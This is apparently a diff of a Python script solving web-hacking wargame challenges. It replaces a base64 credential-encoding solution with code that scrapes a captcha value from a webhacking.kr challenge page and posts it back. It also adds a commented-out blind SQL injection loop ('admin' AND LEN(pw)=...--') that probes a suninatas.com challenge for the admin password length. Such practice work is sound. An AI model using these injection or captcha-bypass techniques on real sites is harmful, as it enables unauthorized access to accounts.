@@ -1,23 +1,26 @@
-import base64
+import requests
+from bs4 import BeautifulSoup
 
-user = 'admin'.encode('UTF-8')
-password = 'nimda'.encode('UTF-8')
+url = 'https://webhacking.kr/challenge/code-4/'
 
-for _ in range(20):
-    user = base64.b64encode(user)
-    password = base64.b64encode(password)
+res = requests.get(url)
+soup = BeautifulSoup(res.text, 'html.parser')
 
-def enc(s):
-    s = s.replace('1', '!')
-    s = s.replace('2', '@')
-    s = s.replace('3', '$')
-    s = s.replace('4', '^')
-    s = s.replace('5', '&')
-    s = s.replace('6', '*')
-    s = s.replace('7', '(')
-    s = s.replace('8', ')')
-    return s
+captcha = soup.find('input', type='button')['value']
+print(captcha)
 
-# replace는 원래값은 그대로임. 그래서 새로 넣어줘야함.
-print(enc(user.decode()))
-print(enc(password.decode()))
+res = requests.post(url, data={'id':'id', 'cmt':'cmt', 'captcha':captcha})
+print(res.text)
+
+
+    # for i in range(1, 20):
+    #     URL = f"http://suninatas.com/challenge/web22/web22.asp?id=admin'+AND+LEN(pw)={i}--&pw=1"
+    #     res = requests.get(URL)
+    #     soup = BeautifulSoup(res.text, 'html.parser')
+    #     try:
+    #         target = soup.find_all("font")[2].get_text()
+    #         if target == 'admin':
+    #             pw_len = i
+    #             break
+    #     except:
+    #         pass
